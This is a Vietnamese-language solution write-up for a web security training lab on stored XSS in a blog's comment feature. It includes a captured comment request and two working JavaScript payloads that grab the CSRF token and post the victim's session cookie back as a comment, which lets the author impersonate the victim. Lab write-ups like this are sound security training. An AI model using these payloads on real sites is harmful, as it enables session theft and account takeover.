Yêu cầu: Phòng thí nghiệm này chứa lỗ hổng XSS được lưu trữ trong chức năng bình luận của blog. Người dùng nạn nhân được mô phỏng sẽ xem tất cả các bình luận sau khi chúng được đăng. Để giải quyết phòng thí nghiệm, hãy khai thác lỗ hổng để trích xuất cookie phiên của nạn nhân, sau đó sử dụng cookie này để mạo danh nạn nhân.

Giải pháp: 
- Bài này có điểm nhập đầu vào là phần comment của bài viết và phần đăng nhập, tuy nhiên không cung cấp tên tài khoản và mật khẩu nên bỏ qua hướng sử dụng tài khoản. 
- Với phần comment, không tìm thấy tập lệnh JS dùng để xử lý trên trang, nhưng có thể thêm script để thoát khỏi thẻ p của phần body của comment --> Tấn công từ đây.
- Mục tiêu là đánh cắp cookie của nạn nhân --> nếu có bản pro có thể sử dụng collaborator để tạo 1 miền do mình kiểm soát --> viết script để khi nạn nhân truy cập bài post sẽ thực hiện 1 request tới miền của ta kèm theo cookie --> ta có thể lấy được cookie 
- Với bản burp thường, ta không có miền kiểm soát --> mục tiêu là khi người dùng truy cập bài post sẽ khiến họ thực hiện 1 comment với nội dung là cookie của họ. --> ta cần quan sát cấu trúc 1 request thực hiện comment trên trang như thế nào:
POST /post/comment HTTP/2
Host: 0a08007b0358314980831257003600c6.web-security-academy.net
Cookie: session=ynMIn72hoB3tg4PqqX4fsQ9pytnyI7fN
Content-Length: 152
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a08007b0358314980831257003600c6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a08007b0358314980831257003600c6.web-security-academy.net/post?postId=10
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=jooP2nPM1Go5hQdv0JBD0IwjApc96M3n&postId=10&comment=%3Cstrong%3Etmt%3C%2Fstrong%3E&name=tmt1&email=tmt2%40gmail.com&website=https%3A%2F%2Fgoogle.com
--> những điều cần chú ý từ request này:
Phương thức: POST
Điểm cuối: /post/comment
Cookie: session=ynMIn72hoB3tg4PqqX4fsQ9pytnyI7fN
Các tham số: csrf=jooP2nPM1Go5hQdv0JBD0IwjApc96M3n&postId=10& ==> Muốn đăng được comment lên post cần có csrf mà csrf là ngẫu nhiên mỗi lần thực hiện comment --> không thể biết trước được. Nhưng ta có thể lấy giá trị của tham số này bằng cách: var token = document.getElementsByName('csrf')[0].value; vì phần tử chứa giá trị csrf có name = csrf.

comment=%3Cstrong%3Etmt%3C%2Fstrong%3E&
name=tmt1&
email=tmt2%40gmail.com&
website=https%3A%2F%2Fgoogle.com

--> mục tiêu của ta bây giờ là tạo 1 form với những trường bắt buộc cùng với giá trị của tham số csrf bắt người dùng thực hiện request này lên trang để ăn cắp cookie --> đoạn script có 2 phần chính: 1 là tạo 1 form để thêm các trường vào cùng với lấy giá trị csrf và cookie của nạn nhân; 2 là thực hiện 1 request tới bài post với phương thức POST và endpoint đã biết
1: tạo form và thêm các trường mong muốn: Có 2 cách để ta thực hiện việc này, 1 là tạo ra 1 form giả, thêm các trường vào form cùng dữ liệu ta đã lấy rồi thực hiện gửi request bằng FormData(); 2 là có thể gửi request với phần body được đặt những tham số mà request gốc đã yêu cầu. Nhưng có sự khác biệt:
+) Với FormData(): kiểu dữ liệu là: multipart/form-data; định dạng dữ liệu như 1 form thực tế; sử dụng khi gửi file, ảnh hoặc dữ liệu trong form 
VD: 
var data = new FormData();
data.append('csrf', 'token123');
data.append('file', document.getElementById('fileInput').files[0]);
fetch('/upload', {
    method: 'POST',
    body: data
});
+) Với body: kiểu dữ liệu: application/x-www-form-urlencoded hoặc application/json; định dạng dữ liệu chuỗi key-value (key=value&key2=value2); sử dụng khi gửi API Rest hoặc không cần xử lý file
VD: fetch('/post/comment', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'csrf=token123&comment=test'
});
==> Ta có thể thực hiện thử nghiệm cả 2 cách này, nhưng cần phải thực hiện khi trang web bắt đầu tải nội dung xong, tức là khi nạn nhân đã truy cập vào bài post --> cần thêm phần xử lý sự kiện khi trang tải --> sử dụng window.addEventListener('DOMContentLoaded',hàm xử lý)
1. Với FormData:
<script>
window.addEventListener('DOMContentLoaded',function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf',token);
    data.append('postId',10);
    data.append('comment',document.cookie);
    data.append('name','victim');
    data.append('email','victim@gmail.com');
    data.append('website','https://google.com');
    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
--> lấy được session: bHoOyBPKU1YgDLqjah9lz5KZsU7N3PTg
2. Với body:
<script>
window.addEventListener('DOMContentLoaded',function(){
    var token = document.getElementsByName('csrf')[0].value;
    fetch('/post/comment',{
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        mode: 'no-cors',
        body: 'csrf=' + encodeURIComponent(token) + '&postId=2&comment=' + encodeURIComponent(document.cookie) + 
'&name=victim&email=victim@gmail.com&website=https://google.com'
    });
});
</script>
--> vẫn lấy được session --> có thể sử dụng được.
